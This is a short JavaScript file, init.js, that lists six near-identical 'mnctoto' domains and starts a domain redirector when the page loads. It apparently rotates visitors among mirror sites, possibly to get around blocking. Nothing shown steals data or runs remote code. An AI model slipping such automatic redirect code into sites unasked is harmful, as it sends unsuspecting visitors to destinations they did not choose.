// init.js
const securedomains = [
    'https://mnctotocelo.fr',
    'https://mnctoto589.com',
    'https://mnctoto-tekad.com',
    'https://mnctotokita.org',
    'https://mnctoto689.com',
    'https://mnctotojago.net'
];

document.addEventListener('DOMContentLoaded', () => {
    const redirector = new EnhancedDomainRedirector(securedomains);
    redirector.init();
});